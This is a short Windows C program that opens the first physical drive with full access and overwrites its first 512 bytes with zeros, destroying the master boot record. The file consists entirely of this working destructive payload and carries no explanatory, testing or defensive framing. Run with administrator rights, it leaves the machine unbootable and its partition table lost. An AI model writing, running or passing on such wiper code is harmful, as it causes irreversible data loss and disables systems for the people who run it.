#include <Windows.h>
#define MBR_SIZE 512

void main()
{
	DWORD write;
	char mbrData[MBR_SIZE];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL);
	CloseHandle(MasterBootRecord);
}
